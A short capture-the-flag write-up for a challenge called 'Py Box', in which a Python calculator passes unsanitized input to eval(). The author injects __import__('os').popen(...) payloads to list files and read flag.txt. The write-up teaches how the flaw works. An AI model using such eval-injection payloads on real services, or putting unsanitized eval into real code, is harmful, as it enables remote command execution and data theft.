# Py Box
> Write-up author: vreshco
## DESCRIPTION:
Aku dapet cara praktis untuk membuat kalkulator di python yaitu pakai eval wkwkwkwk. Ehh ini berbahaya ga sih?

nc ctf.tcp1p.com 5574

## HINT:
- NONE
## STEPS:
1. Given a python script and a machine host which we can run via netcat.
2. Let's analyze the python script first.

> SCRIPT GIVEN

```py
def calculator(txt: str):
    txt = txt.replace("=", "")
    return eval(txt)

with open("logo", 'r') as f:
    print(f.read())

print("aplikasi aritmatika by H3X0S1337")
print("operasi yang bisa digunakan: ")
print("- perkalian '*'")
print("- pembagian '/'")
print("- pertambahan '+'")
print("- pengurangan '-'")
print("- xor '^'")
print("- modulus '%'")
print("- pangkat '**'")
print("- pembagian lantai '//'")
print("contoh pemakaian:")
print("- 1+1 maka akan menghasilkan 2")
while True:
    try:
        user_input = input("masukkan input: ")
        calc = calculator(user_input)
        print(calc)
    except KeyboardInterrupt:
        break
```

3. Based from the script, we know the vuln is at the `eval()`.
4. No sanitization applied, hence all our input shall passed to the `calculator()` and inside it's function there's an `eval()` which evaluated any strings we're passing to.
5. Let's try to list the directories or files.

> COMMAND

```py
__import__("os").popen("ls").read()
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/227164124-3237b421-fb4a-4541-a375-1e3554a05f7c.png)


6. Great it works! Since there's the flag.txt file, let's cat that.

> COMMAND

```py
__import__("os").popen("cat flag.txt").read()
```

![image](https://user-images.githubusercontent.com/70703371/227164415-fd3a2737-b0d4-4700-8db6-761eff4a826a.png)


7. Got the flag!

## FLAG

```
TCP1P{python_3v4l_1s_no_g00d_f0r_calculat0r}
```

